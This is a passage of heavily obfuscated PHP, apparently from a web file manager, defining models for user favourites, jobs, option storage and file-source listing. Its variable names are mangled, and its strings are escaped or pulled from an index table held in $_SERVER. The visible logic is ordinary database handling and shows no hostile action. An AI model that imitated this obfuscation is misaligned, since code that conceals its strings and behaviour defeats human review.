$Ã˜«“¶ï); } public function add($Ê“¨™Ò®) { $”Äçæ£ =& $_SERVER[èùÙ¹Ïö]; $Îè‰Í“ = $this->findByName($Ê“¨™Ò®[$”Äçæ£[32]]); if ($Îè‰Í“) { return !1; } $Ê“¨™Ò®[$”Äçæ£[1653]] = 0; $Ê“¨™Ò®[$”Äçæ£[1918]] = $this->getSort(); return parent::insert($Ê“¨™Ò®); } private function getSort() { $­òÌ§ş’ =& $_SERVER[èùÙ¹Ïö]; $¹ô¹É˜ˆ = parent::listData(); $ïˆÅ¼€Œ = array_to_keyvalue($¹ô¹É˜ˆ, $­òÌ§ş’[12], $­òÌ§ş’[1918]); return empty($ïˆÅ¼€Œ) ? 0 : max($ïˆÅ¼€Œ) + 1; } public function update($øíåÔÔ•, $ÂÌ­ó®) { $’ìş ¡¡ =& $_SERVER[èùÙ¹Ïö]; $ğ»’“òª = $this->listData($øíåÔÔ•); $í®ú¯‘ï = $this->findByName($ÂÌ­ó®[$’ìş ¡¡[32]]); if (!$ğ»’“òª || $í®ú¯‘ï && $í®ú¯‘ï[$’ìş ¡¡[445]] != $ğ»’“òª[$’ìş ¡¡[445]]) { return !1; } return parent::update($øíåÔÔ•, $ÂÌ­ó®); } public function remove($…®šÊÛ›, $ÃÅïĞÔŠ = false) { $Ñò†²ÁÍ =& $_SERVER[èùÙ¹Ïö]; $Ç³ªŒŒ“ = $this->listData($…®šÊÛ›); if (!$Ç³ªŒŒ“) { return; } if (!$ÃÅïĞÔŠ && $Ç³ªŒŒ“[$Ñò†²ÁÍ[181]] == $Ñò†²ÁÍ[90]) { return !1; } return parent::remove($…®šÊÛ›); } public function enable($œ¹äÈùÌ, $ÕŠù¥Šâ) { return $this->update($œ¹äÈùÌ, array($_SERVER[èùÙ¹Ïö][2331] => $ÕŠù¥Šâ)); } public function run($¨€êš) { return $this->update($¨€êš, array($_SERVER[èùÙ¹Ïö][2344] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($çˆõ®¼£) { $–†êˆßÜ =& $_SERVER[èùÙ¹Ïö]; return array($–†êˆßÜ[2005] => array(USER_ID, $–†êˆßÜ[2345])); } protected function listData() { $‘¿ûù÷ =& $_SERVER[èùÙ¹Ïö]; $­õÊ¦È« = array($‘¿ûù÷[1687] => USER_ID, $‘¿ûù÷[528] => 0); $§õÀâŞ° = $‘¿ûù÷[2346]; $ÌƒÔªÌº = $this->field($§õÀâŞ°)->where($­õÊ¦È«)->order($‘¿ûù÷[2347])->select(); return $ÌƒÔªÌº ? $ÌƒÔªÌº : array(); } protected function resetCache() { } protected function listView() { $Ã•Ê²µ =& $_SERVER[èùÙ¹Ïö]; $ıñ÷şşú = $this->listData(); $¸üüü¶© = array_filter_by_field($ıñ÷şşú, $Ã•Ê²µ[33], $Ã•Ê²µ[460]); $ğ÷Ñß›Ë = array_to_keyvalue($¸üüü¶©, $Ã•Ê²µ[12], $Ã•Ê²µ[86]); if (!$ğ÷Ñß›Ë) { return $ıñ÷şşú; } $Í­Ã´ßÇ = 2000; $Áç˜•² = array($Ã•Ê²µ[461] => array($Ã•Ê²µ[462], $ğ÷Ñß›Ë)); $İ»ª¾Òö = Model($Ã•Ê²µ[865])->listSource($Áç˜•², $Í­Ã´ßÇ); $İ»ª¾Òö = array_merge($İ»ª¾Òö[$Ã•Ê²µ[85]], $İ»ª¾Òö[$Ã•Ê²µ[84]]); $İ»ª¾Òö = array_to_keyvalue($İ»ª¾Òö, $Ã•Ê²µ[183]); foreach ($ıñ÷şşú as $ûÛ¶ÄÁí => $Ôı¹…¼) { $È¾ç§Í = $İ»ª¾Òö[$Ôı¹…¼[$Ã•Ê²µ[86]]]; $È¾ç§Í = $È¾ç§Í ? $È¾ç§Í : array(); $ıñ÷şşú[$ûÛ¶ÄÁí] = array_merge($È¾ç§Í, $Ôı¹…¼); } return $ıñ÷şşú; } protected function addFav($¤²”Ì”ƒ, $’ƒÊ„§Ê = '', $«í¯¡â¯ = "\x73\157\x75\x72\x63\x65") { $©À½÷Ş¾ =& $_SERVER[èùÙ¹Ïö]; $±ÖîÌ×á = array($©À½÷Ş¾[1687] => USER_ID, $©À½÷Ş¾[528] => 0, $©À½÷Ş¾[466] => $«í¯¡â¯, $©À½÷Ş¾[465] => $¤²”Ì”ƒ); if ($this->where($±ÖîÌ×á)->find()) { return !1; } $±ÖîÌ×á = array($©À½÷Ş¾[1687] => USER_ID, $©À½÷Ş¾[528] => 0); $Í£°Û¦Ş = $this->where($±ÖîÌ×á)->max($©À½÷Ş¾[1918]); if (!$Í£°Û¦Ş) { $Í£°Û¦Ş = 0; } if (!$’ƒÊ„§Ê && $«í¯¡â¯ == $©À½÷Ş¾[460]) { $÷¢Ã½–Õ = Model($©À½÷Ş¾[1381])->where(array($©À½÷Ş¾[461] => $¤²”Ì”ƒ))->find(); if (!$÷¢Ã½–Õ) { return !1; } $’ƒÊ„§Ê = $÷¢Ã½–Õ[$©À½÷Ş¾[32]]; } $’ƒÊ„§Ê = $this->getAutoName($’ƒÊ„§Ê); $úÅ–‹Ãå = array($©À½÷Ş¾[1687] => USER_ID, $©À½÷Ş¾[528] => 0, $©À½÷Ş¾[464] => $’ƒÊ„§Ê, $©À½÷Ş¾[465] => $¤²”Ì”ƒ, $©À½÷Ş¾[466] => $«í¯¡â¯, $©À½÷Ş¾[1898] => $Í£°Û¦Ş + 1); return $this->add($úÅ–‹Ãå); } protected function remove($™ï¹ÍÑ ) { $´ÕÑı =& $_SERVER[èùÙ¹Ïö]; $‘î£æ“É = array($´ÕÑı[1687] => USER_ID, $´ÕÑı[463] => $™ï¹ÍÑ ); return $this->where($‘î£æ“É)->delete(); } protected function removeByName($²ßŞşË¦) { $Û²öÓü• =& $_SERVER[èùÙ¹Ïö]; $÷¦¨º—º = array($Û²öÓü•[1687] => USER_ID, $Û²öÓü•[464] => $²ßŞşË¦, $Û²öÓü•[528] => 0); return $this->where($÷¦¨º—º)->delete(); } protected function rename($ÆÀÂ¹‘, $ó¼àêï) { $°Æ•ä…ª =& $_SERVER[èùÙ¹Ïö]; if ($ÆÀÂ¹‘ == $ó¼àêï) { return !1; } $Æ‰’Çâä = $this->getAutoName($ó¼àêï); if ($ó¼àêï != $Æ‰’Çâä) { return !1; } $ „ºï®÷ = array($°Æ•ä…ª[1687] => USER_ID, $°Æ•ä…ª[528] => 0, $°Æ•ä…ª[32] => $ÆÀÂ¹‘); return $this->where($ „ºï®÷)->save(array($°Æ•ä…ª[32] => $ó¼àêï)); } protected function resetSort($…ºµŠô’) { $¼»èšÜû =& $_SERVER[èùÙ¹Ïö]; $…ºµŠô’ = is_array($…ºµŠô’) ? $…ºµŠô’ : array(); $áÖ†İ„³ = array($¼»èšÜû[1687] => USER_ID); for ($İŒ®Ê®° = 0; $İŒ®Ê®° < count($…ºµŠô’); $İŒ®Ê®°++) { $áÖ†İ„³[$¼»èšÜû[463]] = $…ºµŠô’[$İŒ®Ê®°]; $this->where($áÖ†İ„³)->save(array($¼»èšÜû[1898] => $İŒ®Ê®° + 1)); } return !0; } protected function moveTop($ËáİƒŒã) { $Ó–ÍÎù =& $_SERVER[èùÙ¹Ïö]; $ã¤Ù¡´£ = array($Ó–ÍÎù[1687] => USER_ID, $Ó–ÍÎù[528] => 0); $ÇëçƒÔ = $this->where($ã¤Ù¡´£)->where(array($Ó–ÍÎù[32] => $ËáİƒŒã))->find(); if (!$ÇëçƒÔ) { return; } $ôøÏÂ× = $this->field($Ó–ÍÎù[445])->where($ã¤Ù¡´£)->order($Ó–ÍÎù[2347])->select(); $ôøÏÂ× = array_to_keyvalue($ôøÏÂ×, $Ó–ÍÎù[12], $Ó–ÍÎù[445]); $¿äíò½ = $ôøÏÂ×; $ôøÏÂ× = array_remove_value($ôøÏÂ×, $ÇëçƒÔ[$Ó–ÍÎù[445]]); array_unshift($ôøÏÂ×, $ÇëçƒÔ[$Ó–ÍÎù[445]]); return $this->resetSort($ôøÏÂ×); } protected function moveBottom($ıİŒ™¿ô) { $ûÑ”Û =& $_SERVER[èùÙ¹Ïö]; $šüî¬ = array($ûÑ”Û[1687] => USER_ID, $ûÑ”Û[528] => 0); $®¬Ã“… = $this->where($šüî¬)->max($ûÑ”Û[1918]); $•ƒ§Ä´‹ = array($ûÑ”Û[1918] => $®¬Ã“… + 1); return $this->where($šüî¬)->where(array($ûÑ”Û[32] => $ıİŒ™¿ô))->save($•ƒ§Ä´‹); } private function getAutoName($ôüÕ„») { $Ñæö›®÷ =& $_SERVER[èùÙ¹Ïö]; $‘±°Ì¨ = array($Ñæö›®÷[1687] => USER_ID, $Ñæö›®÷[528] => 0); $¸²Ñ¼ü = $this->field($Ñæö›®÷[32])->where($‘±°Ì¨)->select(); $¸²Ñ¼ü = array_to_keyvalue($¸²Ñ¼ü, $Ñæö›®÷[12], $Ñæö›®÷[32]); if (!$¸²Ñ¼ü || !in_array($ôüÕ„», $¸²Ñ¼ü)) { return $ôüÕ„»; } for ($¬“Ÿ‰ãÇ = 0; $¬“Ÿ‰ãÇ < count($¸²Ñ¼ü); $¬“Ÿ‰ãÇ++) { if (!in_array($ôüÕ„» . "\x28{$¬“Ÿ‰ãÇ}\x29", $¸²Ñ¼ü)) { return $ôüÕ„» . "\50{$¬“Ÿ‰ãÇ}\51"; } } return $ôüÕ„» . "\x28{$¬“Ÿ‰ãÇ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\152\157\142\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x64\x65\163\143", "\163\x6f\x72\164"); const JOB_KEY = "\x73\145\154\x66\112\x6f\142\114\151\x73\164"; public function listData($“ÈŒññĞ = false, $ñŞìî¦™ = "\x73\x6f\162\164", $ÙöŠª¹Ì = false) { return parent::listData($“ÈŒññĞ, $ñŞìî¦™, $ÙöŠª¹Ì); } public function remove($ƒôáÍå„) { return parent::remove($ƒôáÍå„); } public function add($ñ Ò¯¥) { $Æ¤ÂŸ÷¯ =& $_SERVER[èùÙ¹Ïö]; if ($this->findByName($ñ Ò¯¥[$Æ¤ÂŸ÷¯[32]])) { return !1; } $ñ Ò¯¥[$Æ¤ÂŸ÷¯[1918]] = $this->getSort(); return parent::insert($ñ Ò¯¥); } private function getSort() { $ —ã =& $_SERVER[èùÙ¹Ïö]; $çĞï•ñº = parent::listData(); $îøíœ… = array_to_keyvalue($çĞï•ñº, $ —ã[12], $ —ã[1918]); return empty($îøíœ…) ? 0 : max($îøíœ…) + 1; } public function update($ŒÅ²•¾, $Âê†¢ô›) { $·Üş¼¿œ =& $_SERVER[èùÙ¹Ïö]; $ÜÒŒµŒ = parent::listData($ŒÅ²•¾); $Ô¯êöı = $this->findByName($Âê†¢ô›[$·Üş¼¿œ[32]]); if (!$ÜÒŒµŒ || $Ô¯êöı && $Ô¯êöı[$·Üş¼¿œ[445]] != $ÜÒŒµŒ[$·Üş¼¿œ[445]]) { return !1; } return parent::update($ŒÅ²•¾, $Âê†¢ô›); } public function setUserJob($é…èš÷, $ŞÖ˜úìà) { $§í‹Äù© =& $_SERVER[èùÙ¹Ïö]; if (!is_array($ŞÖ˜úìà)) { $ŞÖ˜úìà = array($ŞÖ˜úìà); } $¶Ôü™³½ = parent::listData(); $Õ–¹¼éé = array_to_keyvalue($¶Ôü™³½, $§í‹Äù©[32]); $ôßÅí˜æ = $§í‹Äù©[424]; foreach ($ŞÖ˜úìà as $ç›·ÉÃë) { if ($Õ–¹¼éé[$ç›·ÉÃë]) { $ôßÅí˜æ .= $Õ–¹¼éé[$ç›·ÉÃë][$§í‹Äù©[445]] . $§í‹Äù©[50]; } else { $á¶›ä§ = $this->add($ç›·ÉÃë); $ôßÅí˜æ .= $á¶›ä§ . $§í‹Äù©[50]; } } $ôßÅí˜æ = rtrim($ôßÅí˜æ, $§í‹Äù©[50]); Model($§í‹Äù©[570])->metaSet($é…èš÷, self::JOB_KEY, $ôßÅí˜æ); } public function getUserJob($µ„¸‹Ñ«) { $Ì‚õÑé = Model($_SERVER[èùÙ¹Ïö][570])->metaGet($µ„¸‹Ñ«); return $this->getUserJobInfo($Ì‚õÑé[self::JOB_KEY]); } public function getUserJobInfo($µÜ‘Ëè¸) { $ÂüíÖÔ½ =& $_SERVER[èùÙ¹Ïö]; $ñ˜±æúõ = explode($ÂüíÖÔ½[50], $µÜ‘Ëè¸); $¼Ì‚ƒØü = parent::listData(); $¼Ì‚ƒØü = array_remove_key($¼Ì‚ƒØü, $ÂüíÖÔ½[217]); $Æ–¾âÑ· = array(); foreach ($ñ˜±æúõ as $€¯Ôš»€) { if (isset($¼Ì‚ƒØü[$€¯Ôš»€])) { $Æ–¾âÑ·[] = $¼Ì‚ƒØü[$€¯Ôš»€]; } } return $Æ–¾âÑ·; } } goto A‘ÈÁÚİÏ; cÙºŞ¹äÒ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ø÷¯Ğ¦ = false, $ºóŸ¨°  = '', $ÁÄ¾©Èõ = false) { $ ˆ“Œ®¥ =& $_SERVER[èùÙ¹Ïö]; $¾ÑËÆàº = $this->cacheGet($ºóŸ¨° ); $è½»©şŸ = $this->optionDefault($ºóŸ¨° ); $è½»©şŸ = is_array($è½»©şŸ) ? $è½»©şŸ : array(); if (is_array($¾ÑËÆàº)) { $¾ÑËÆàº = array_merge($è½»©şŸ, $¾ÑËÆàº); return $Ø÷¯Ğ¦ ? isset($¾ÑËÆàº[$Ø÷¯Ğ¦]) ? $¾ÑËÆàº[$Ø÷¯Ğ¦] : null : $¾ÑËÆàº; } $±¢Ô• = $this->filterWhere(array($ ˆ“Œ®¥[33] => $ºóŸ¨° )); $¾ÑËÆàº = $this->where($±¢Ô•)->select(); $¾ÑËÆàº = array_to_keyvalue($¾ÑËÆàº, $ ˆ“Œ®¥[96], $ ˆ“Œ®¥[420]); foreach ($¾ÑËÆàº as $©¡¦¸±‘ => $¾¾º’») { if ($ÁÄ¾©Èõ || in_array($©¡¦¸±‘, $this->jsonField)) { $¾ÑËÆàº[$©¡¦¸±‘] = json_decode($¾¾º’», !0); } } $this->cacheSet($ºóŸ¨° , $¾ÑËÆàº); $¾ÑËÆàº = array_merge($è½»©şŸ, $¾ÑËÆàº); return $Ø÷¯Ğ¦ ? $¾ÑËÆàº[$Ø÷¯Ğ¦] : $¾ÑËÆàº; } public function set($å£›³‘, $ûáÀš÷ = false, $†şû¨ˆ = '') { $Ã‡íëÀŸ =& $_SERVER[èùÙ¹Ïö]; $this->cacheRemove($†şû¨ˆ); $Úø”ïŒö = array(); $¨Âğ¤˜Ø = is_array($å£›³‘) ? $å£›³‘ : array($å£›³‘ => $ûáÀš÷); foreach ($¨Âğ¤˜Ø as $ÒÒ·åºŸ => $ñ÷öå³×) { if (is_array($ñ÷öå³×)) { $ñ÷öå³× = json_encode_force($ñ÷öå³×); } $this->checkLength($ñ÷öå³×, !1, $this->tableName . $Ã‡íëÀŸ[4] . $å£›³‘); $ñ÷öå³× = self::textEncode($ñ÷öå³×); $¨Âğ¤˜Ø = array($Ã‡íëÀŸ[33] => $†şû¨ˆ, $Ã‡íëÀŸ[96] => $ÒÒ·åºŸ, $Ã‡íëÀŸ[420] => $ñ÷öå³×); $Úø”ïŒö[] = $this->filterWhere($¨Âğ¤˜Ø); } if (!$Úø”ïŒö) { return !0; } $éÄ±ı¶Ô = $this->cacheKey($Ã‡íëÀŸ[446]); CacheLock::lock($éÄ±ı¶Ô); $á…Éß = $this->addAll($Úø”ïŒö, array(), !0); CacheLock::unlock($éÄ±ı¶Ô); return $á…Éß; } protected function optionDefault($é·÷Êá© = '') { return !1; } public function setDeep($’öÃËê, $Î¬ïÑÆ† = false, $İÙÖÛò© = '') { $³ß›­Ó = explode($_SERVER[èùÙ¹Ïö][10], $’öÃËê); $Ôå¸’” = $this->get(); array_set_value($Ôå¸’”, $’öÃËê, $Î¬ïÑÆ†); $this->set($³ß›­Ó[0], $Ôå¸’”[$³ß›­Ó[0]], $İÙÖÛò©); } public function remove($Î‘Æ÷—ç, $É¦‡®ë = '') { $Ä„¥‚Ç =& $_SERVER[èùÙ¹Ïö]; $this->cacheRemove($É¦‡®ë); $¼¹ş£Òù = $this->filterWhere(array($Ä„¥‚Ç[96] => $Î‘Æ÷—ç, $Ä„¥‚Ç[33] => $É¦‡®ë)); if (is_null($Î‘Æ÷—ç)) { unset($¼¹ş£Òù[$Ä„¥‚Ç[96]]); } return $this->where($¼¹ş£Òù)->delete(); } public function cacheSet($£´¾†á¼, $°¶õ•¿¿ = false) { return Cache::set($this->cacheKey($£´¾†á¼), $°¶õ•¿¿); } public function cacheGet($²„…”É) { return Cache::get($this->cacheKey($²„…”É)); } public function cacheRemove($é²½¯Şå) { return Cache::remove($this->cacheKey($é²½¯Şå)); } protected function filterWhere($üì›òäÔ) { return $üì›òäÔ; } protected function cacheKey($Ã•ö€€) { return $Ã•ö€€; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\x63\145"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\x61\155\x65" => "\151\x6f\x5f\163\157\165\162\x63\145\137\x6d\x65\x74\141", "\x6d\x65\164\141\x46\151\x65\154\x64" => "\x73\x6f\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\146\171\124\151\155\145", "\x74\151\x6d\x65", "\x69\156\163\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\x6e"), array("\x63\x72\145\x61\x74\145\124\x69\155\145", "\x74\x69\155\145", "\151\156\x73\145\x72\164", "\146\165\156\143\x74\151\157\156"), array("\166\151\145\x77\124\x69\x6d\145", "\164\151\x6d\x65", "\151\x6e\x73\x65\x72\164", "\x66\165\x6e\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ğ™Ã•²ñ) { return $this->listSource(array($_SERVER[èùÙ¹Ïö][447] => $Ğ™Ã•²ñ)); } public function typeName($¦èÇÍô™) { static $ğµ™²Òñ = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $ğµ™²Òñ[$¦èÇÍô™ . $_SERVER[èùÙ¹Ïö][12]]; } public function sourceListInfo($‰ñğ²Åé, $ıó¯øæ = false) { $Ê–‹·Ôì =& $_SERVER[èùÙ¹Ïö]; $‰ñğ²Åé = $‰ñğ²Åé ? $‰ñğ²Åé : array(); $‰ñğ²Åé = array_filter(array_unique($‰ñğ²Åé)); if (!$‰ñğ²Åé) { return array(); } $çÔ·ÇÓÃ = $this->where(array($Ê–‹·Ôì[183] => array($Ê–‹·Ôì[7], $‰ñğ²Åé)))->select(); $this->_listDataApply($çÔ·ÇÓÃ, $ıó¯øæ); return array_to_keyvalue($çÔ·ÇÓÃ, $Ê–‹·Ôì[183]); } public function pathInfoFilter(&$îôÌ §Ä) { $­Š§õÄ =& $_SERVER[èùÙ¹Ïö]; static $€›¤‹ùÏ = false; static $à—«†ë° = false; static $‡š¡Áê = false; if (!$€›¤‹ùÏ) { $ˆíöÅü = $­Š§õÄ[448]; $ˆíöÅü .= $­Š§õÄ[449]; $ˆíöÅü .= $­Š§õÄ[450]; $Ô‹«š†õ = $­Š§õÄ[451]; $¤êÄñ³Ã = explode($­Š§õÄ[50], $Ô‹«š†õ); $€›¤‹ùÏ = explode($­Š§õÄ[50], $ˆíöÅü); $à—«†ë° = array(); foreach ($€›¤‹ùÏ as $ƒëÕšÅ) { if (in_array($ƒëÕšÅ, $¤êÄñ³Ã)) { continue; } $à—«†ë°[] = $ƒëÕšÅ; } $‡š¡Áê = explode($­Š§õÄ[50], $­Š§õÄ[452]); } foreach ($‡š¡Áê as $Œ¶³˜ÉÌ) { if (isset($îôÌ §Ä[$Œ¶³˜ÉÌ])) { $îôÌ §Ä[$Œ¶³˜ÉÌ] = intval($îôÌ §Ä[$Œ¶³˜ÉÌ]); } } $îôÌ §Ä[$­Š§õÄ[86]] = $­Š§õÄ[453] . $îôÌ §Ä[$­Š§õÄ[183]] . $­Š§õÄ[454]; $îôÌ §Ä[$­Š§õÄ[33]] = $îôÌ §Ä[$­Š§õÄ[455]] == 1 ? $­Š§õÄ[77] : $­Š§õÄ[216]; $îôÌ §Ä[$­Š§õÄ[180]] = $this->typeName($îôÌ §Ä[$­Š§õÄ[180]]); if ($îôÌ §Ä[$­Š§õÄ[455]] != 1) { $îôÌ §Ä[$­Š§õÄ[177]] = $îôÌ §Ä[$­Š§õÄ[456]]; unset($îôÌ §Ä[$­Š§õÄ[456]]); } $ïüÁ‘–Ë = $€›¤‹ùÏ; if (isset($îôÌ §Ä[$­Š§õÄ[457]]) && $îôÌ §Ä[$­Š§õÄ[457]][$­Š§õÄ[458]] == -1) { $ïüÁ‘–Ë = $à—«†ë°; } $îôÌ §Ä = array_field_key($îôÌ §Ä, $ïüÁ‘–Ë); return $îôÌ §Ä; } public function listUserFav() { $âûƒ£† =& $_SERVER[èùÙ¹Ïö]; $å»Ó‘›ş = Model($âûƒ£†[459])->listData(); $ ºö‚± = array_filter_by_field($å»Ó‘›ş, $âûƒ£†[33], $âûƒ£†[460]); $ ºö‚± = array_to_keyvalue($ ºö‚±, $âûƒ£†[12], $âûƒ£†[86]); if ($ ºö‚±) { $ƒü´›› = $this->listSource(array($âûƒ£†[461] => array($âûƒ£†[462], $ ºö‚±))); } $ƒü´›› = array_to_keyvalue($ƒü´››[$âûƒ£†[415]], $âûƒ£†[183]); foreach ($å»Ó‘›ş as &$·º¤—‡) { $·º¤—‡ = array($âûƒ£†[463] => $·º¤—‡[$âûƒ£†[445]], $âûƒ£†[464] => $·º¤—‡[$âûƒ£†[32]], $âûƒ£†[465] => $·º¤—‡[$âûƒ£†[86]], $âûƒ£†[466] => $·º¤—‡[$âûƒ£†[33]], $âûƒ£†[467] => $·º¤—‡[$âûƒ£†[217]], $âûƒ£†[468] => $·º¤—‡[$âûƒ£†[87]]); if ($·º¤—‡[$âûƒ£†[33]] == $âûƒ£†[460] && $ƒü´››[$·º¤—‡[$âûƒ£†[86]]]) { $·º¤—‡[$âûƒ£†[89]] = $ƒü´››[$·º¤—‡[$âûƒ£†[86]]]; } } unset($·º¤—‡); return $å»Ó‘›ş; } public function listUserTag($ÜÜˆòƒÎ) { $ñœšç§¢ =& $_SERVER[èùÙ¹Ïö]; if ($ÜÜˆòƒÎ && !is_array($ÜÜˆòƒÎ)) { $ÜÜˆòƒÎ = array($ÜÜˆòƒÎ); } $¯˜¿¤â = Model($ñœšç§¢[469])->listData(); $‡¥ú”¯£ = array(); $»‘ëÍâ· = array(); foreach ($¯˜¿¤â as $ƒÏÃÄ¼á) { $È°Âò’ = $ƒÏÃÄ¼á[$ñœšç§¢[86]]; if (!$È°Âò’) { continue; } if (!isset($»‘ëÍâ·[$È°Âò’])) { $»‘ëÍâ·[$È°Âò’] = array(); } $»‘ëÍâ·[$È°Âò’][] = $ƒÏÃÄ¼á[$ñœšç§¢[470]]; $‡¥ú”¯£[$ƒÏÃÄ¼á[$ñœšç§¢[86]]] = $ƒÏÃÄ¼á; } $è¨Ş = array(); $¬ƒ§š– = array(); $ßùü‰§ = array(); foreach ($»‘ëÍâ· as $…•ŸñÜš => $§†äõ¶) { $»¶êã¹ = !0; if (!$ÜÜˆòƒÎ) { $è¨Ş[] = $…•ŸñÜš; continue; } foreach ($ÜÜˆòƒÎ as $½¸¥Ô‘) { if (!in_array($½¸¥Ô‘, $§†äõ¶)) { $»¶êã¹ = !1; break; } } if (!$»¶êã¹) { continue; } if (!is_numeric($…•ŸñÜš)) { $‹ ö²‚ = $‡¥ú”¯£[$…•ŸñÜš]; $¬ÈÛ¼Ş = array($ñœšç§¢[32] => $‹ ö²‚[$ñœšç§¢[32]], $ñœšç§¢[86] => $‹ ö²‚[$ñœšç§¢[86]], $ñœšç§¢[33] => $‹ ö²‚[$ñœšç§¢[33]], $ñœšç§¢[89] => array($ñœšç§¢[471] => 1), $ñœšç§¢[218] => !0); if ($‹ ö²‚[$ñœšç§¢[33]] == $ñœšç§¢[216]) { $ßùü‰§[] = $¬ÈÛ¼Ş; } if ($‹ ö²‚[$ñœšç§¢[33]] == $ñœšç§¢[77]) { $¬ƒ§š–[] = $¬ÈÛ¼Ş; } continue; } $è¨Ş[] = $…•ŸñÜš; } if ($è¨Ş) { $…¨¢¶¹¢ = $this->listSource(array($ñœšç§¢[461] => array($ñœšç§¢[462], $è¨Ş))); } $…¨¢¶¹¢ = $…¨¢¶¹¢ ? $…¨¢¶¹¢ : array($ñœšç§¢[84] => array(), $ñœšç§¢[85] => array()); $…¨¢¶¹¢[$ñœšç§¢[84]] = array_merge($…¨¢¶¹¢[$ñœšç§¢[84]], $¬ƒ§š–); $…¨¢¶¹¢[$ñœšç§¢[85]] = array_merge($…¨¢¶¹¢[$ñœšç§¢[85]], $ßùü‰§); if (isset($…¨¢¶¹¢[$ñœšç§¢[412]]) && count($è¨Ş) == $…¨¢¶¹¢[$ñœšç§¢[412]][$ñœšç§¢[413]]) { return $…¨¢¶¹¢; } $ó ÉİÅ¤ = array(); $ÃñÛ‹õ³ = array_to_keyvalue($…¨¢¶¹¢[$ñœšç§¢[84]], $ñœšç§¢[12], $ñœšç§¢[183]); $Û£ƒØ¶’ = array_to_keyvalue($…¨¢¶¹¢[$ñœšç§¢[85]], $ñœšç§¢[12], $ñœšç§¢[183]); $æİËş‡± = array_merge($Û£ƒØ¶’, $ÃñÛ‹õ³); foreach ($è¨Ş as $È°Âò’) { if (!in_array($È°Âò’, $æİËş‡±)) { $ó ÉİÅ¤[] = $È°Âò’; } } if ($ó ÉİÅ¤) { Model($ñœšç§¢[472])->removeBySource($ó ÉİÅ¤); } return $…¨¢¶¹¢; } public function listUserRecycle() { $ŠÊ”å¿Ï =& $_SERVER[èùÙ¹Ïö]; $îÚÚò¬ = Model($ŠÊ”å¿Ï[473])->listData(); if (!$îÚÚò¬) { return array(); } $Ö„…Â‡ó = array($ŠÊ”å¿Ï[461] => array($ŠÊ”å¿Ï[462], $îÚÚò¬), $ŠÊ”å¿Ï[474] => 1); return $this->listSource($Ö„…Â‡ó); } public function listSource($³‰¶®±Ì, $Ó™†ò÷ = 3000, $èéêòÜ¨ = false) { $¤¢ªèë =& $_SERVER[èùÙ¹Ïö]; if (!isset($³‰¶®±Ì[$¤¢ªèë[475]])) { $³‰¶®±Ì[$¤¢ªèë[475]] = 0; } if (isset($³‰¶®±Ì[$¤¢ªèë[182]]) && $³‰¶®±Ì[$¤¢ªèë[182]] == $¤¢ªèë[214]) { $³‰¶®±Ì[$¤¢ªèë[456]] = array($¤¢ªèë[377], $¤¢ªèë[476]); } $„³ñ¼‹® = $¤¢ªèë[477]; $áÉµ½û‘ = $this->field($„³ñ¼‹®)->_makeOrder()->where($³‰¶®±Ì)->selectPage($Ó™†ò÷); $this->_listPageCheck($áÉµ½û‘, $„³ñ¼‹®, $³‰¶®±Ì); $this->_listDataApply($áÉµ½û‘[$¤¢ªèë[415]], $èéêòÜ¨); $this->_listMake($áÉµ½û‘); return $áÉµ½û‘; } private function _listPageCheck(&$§¶¢³Òó, $°úßš‡, $ÊŠ‘õãŸ) { $«£¾âÕè =& $_SERVER[èùÙ¹Ïö]; if (!is_array($§¶¢³Òó[$«£¾âÕè[412]])) { return; } $‹•ãš‹ˆ = $§¶¢³Òó[$«£¾âÕè[412]]; if ($‹•ãš‹ˆ[$«£¾âÕè[414]] <= 1) { return; } if ($‹•ãš‹ˆ[$«£¾âÕè[413]] >= 100000) { return; } if (Model($«£¾âÕè[478])->get($«£¾âÕè[479]) != $«£¾âÕè[480]) { return; } $°úßš‡ = str_replace(array($«£¾âÕè[53], $«£¾âÕè[388], $«£¾âÕè[248]), $«£¾âÕè[12], $°úßš‡); $°úßš‡ = $«£¾âÕè[481] . str_replace($«£¾âÕè[50], $«£¾âÕè[482], $°úßš‡) . $«£¾âÕè[483]; $ñµĞŠ¹ï = $«£¾âÕè[484]; $ñµĞŠ¹ï = $ñµĞŠ¹ï . $«£¾âÕè[485]; $€Ğºª„  = $‹•ãš‹ˆ[$«£¾âÕè[409]] * ($‹•ãš‹ˆ[$«£¾âÕè[399]] - 1) . $«£¾âÕè[50] . $‹•ãš‹ˆ[$«£¾âÕè[409]]; $ÃÜøè‰” = $this->_makeOrder(!0); $Êô¤÷Ğ• = $«£¾âÕè[481] . str_replace($«£¾âÕè[50], $«£¾âÕè[482], $ÃÜøè‰”[0]); if (strpos($Êô¤÷Ğ•, $«£¾âÕè[486])) { $Êô¤÷Ğ• = str_replace($«£¾âÕè[486], $«£¾âÕè[487], $Êô¤÷Ğ•); } else { $Êô¤÷Ğ• .= $«£¾âÕè[488] . $ÃÜøè‰”[1]; } $”‘…†¸Æ = array(); foreach ($ÊŠ‘õãŸ as $Í°¯™¬¾ => $¢úüÙ—æ) { $”‘…†¸Æ[$«£¾âÕè[481] . $Í°¯™¬¾] = $¢úüÙ—æ; } $this->alias($«£¾âÕè[489])->field($°úßš‡)->limit($€Ğºª„ )->order($Êô¤÷Ğ•); $¹ÏÒÓÎ¡ = $this->join($ñµĞŠ¹ï)->where($”‘…†¸Æ)->select(); if ($¹ÏÒÓÎ¡) { $§¶¢³Òó[$«£¾âÕè[415]] = $¹ÏÒÓÎ¡; } } protected function _makeOrder($åÍßà§º = false) { $¼ì¦¦ÁÙ =& $_SERVER[èùÙ¹Ïö]; $¶ˆ£ÕŠ² = 